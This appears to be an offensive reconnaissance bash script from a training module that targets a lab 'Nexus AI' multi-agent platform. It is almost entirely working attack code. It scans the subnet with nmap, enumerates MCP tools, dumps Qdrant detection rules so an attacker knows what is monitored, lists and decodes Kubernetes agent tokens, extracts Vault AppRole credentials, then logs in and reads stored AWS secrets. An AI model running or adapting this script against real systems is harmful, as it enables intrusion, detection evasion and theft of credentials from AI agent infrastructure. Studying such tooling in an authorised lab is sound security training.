#!/usr/bin/env bash
# Script: nexus_recon.sh
# Module: 10 — Threat Modeling for AI-Enabled Targets
# Purpose: Full reconnaissance script for Nexus AI — maps services, extracts
#          crown jewels, enumerates MCP tools, Qdrant collections, K8s secrets
# Usage: K8S_TOKEN=<token> bash nexus_recon.sh <subnet>
# Target: Nexus AI multi-agent platform (adapt IPs as needed)

SUBNET=${1:-10.10.50.0/24}
QDRANT=${QDRANT:-10.10.50.20}
MCP=${MCP:-10.10.50.15}
VAULT=${VAULT:-10.10.50.22}
MLFLOW=${MLFLOW:-10.10.50.21}
NS=${NS:-nexus-ai}

echo "=== Nexus AI Threat Model Recon ==="
echo "Subnet: $SUBNET | Qdrant: $QDRANT | MCP: $MCP"
echo ""

# ─── Phase 1: Network Discovery ───────────────────────────────────────────────
echo "[Phase 1] Network service discovery"
echo "  Running nmap -sV on AI service ports (low noise — targeted)"
nmap -sV -p 9000-9005,6333,5000,8200,16333 --open "$SUBNET" 2>/dev/null
echo ""

# ─── Phase 2: MCP Tool Enumeration ────────────────────────────────────────────
echo "[Phase 2] MCP Server tool surface"
echo "  GET /tools — reveals all tools including those absent from OSINT"
curl -s "http://$MCP:9005/tools" | jq '.tools[] | {name, description, parameters: (.inputSchema.properties | keys)}'
echo ""

# ─── Phase 3: Qdrant Auth Check + Collection Listing ──────────────────────────
echo "[Phase 3] Qdrant (prod :6333) — auth check and collection listing"
curl -s "http://$QDRANT:6333/collections" | jq '.result.collections[].name'
echo ""

echo "[Phase 3b] Qdrant — extracting ALL detection rules (OPSEC intelligence)"
curl -s "http://$QDRANT:6333/collections/detection_rules/points/scroll" \
    -X POST -H "Content-Type: application/json" \
    -d '{"limit": 100, "with_payload": true, "with_vector": false}' | \
    jq '.result.points[] | {rule_name: .payload.rule_name, description: .payload.description, severity: .payload.severity}'
echo ""

echo "[Phase 3c] Qdrant — runbook corpus (infrastructure intelligence)"
curl -s "http://$QDRANT:6333/collections/runbook_corpus/points/scroll" \
    -X POST -H "Content-Type: application/json" \
    -d '{"limit": 50, "with_payload": true, "with_vector": false}' | \
    jq '.result.points[].payload | {title, content}'
echo ""

# ─── Phase 4: K8s Secret Enumeration ──────────────────────────────────────────
if [ -n "$K8S_TOKEN" ]; then
    echo "[Phase 4] K8s secret listing (namespace: $NS)"
    kubectl --token="$K8S_TOKEN" get secrets -n "$NS" \
        -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}'
    echo ""

    echo "[Phase 4b] Extracting and decoding all agent tokens"
    for secret in $(kubectl --token="$K8S_TOKEN" get secrets -n "$NS" \
        -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null | grep "agent-token"); do
        echo "  --- $secret ---"
        token=$(kubectl --token="$K8S_TOKEN" get secret "$secret" -n "$NS" \
            -o jsonpath='{.data.token}' 2>/dev/null | base64 -d)
        # Decode JWT payload
        echo "$token" | cut -d'.' -f2 | base64 -d 2>/dev/null | \
            python3 -m json.tool 2>/dev/null | grep -E '"agent"|"scope"'
        echo "  Token: $token"
    done
    echo ""

    echo "[Phase 4c] Vault AppRole credentials"
    kubectl --token="$K8S_TOKEN" get secret nexus-mcp-vault-approle -n "$NS" \
        -o json 2>/dev/null | jq '.data | map_values(@base64d)'
    echo ""
else
    echo "[Phase 4] Skipped — K8S_TOKEN not set"
fi

# ─── Phase 5: Vault Enumeration (if AppRole obtained) ─────────────────────────
if [ -n "$VAULT_ROLE_ID" ] && [ -n "$VAULT_SECRET_ID" ]; then
    echo "[Phase 5] Vault — AppRole login and secret enumeration"
    VAULT_TOKEN=$(curl -s "http://$VAULT:8200/v1/auth/approle/login" \
        -X POST -H "Content-Type: application/json" \
        -d "{\"role_id\": \"$VAULT_ROLE_ID\", \"secret_id\": \"$VAULT_SECRET_ID\"}" | \
        jq -r '.auth.client_token')
    echo "  Vault token: $VAULT_TOKEN"

    echo "  Listing secret paths"
    curl -s "http://$VAULT:8200/v1/secret/metadata/?list=true" \
        -H "X-Vault-Token: $VAULT_TOKEN" | jq '.data.keys'

    echo "  Reading nexus/aws (Crown Jewel #1)"
    curl -s "http://$VAULT:8200/v1/secret/data/nexus/aws" \
        -H "X-Vault-Token: $VAULT_TOKEN" | jq '.data.data'
else
    echo "[Phase 5] Skipped — VAULT_ROLE_ID / VAULT_SECRET_ID not set"
fi

echo ""
echo "=== Recon complete ==="
echo "Next: decode agent JWTs, extract scope claims, build assumption register"
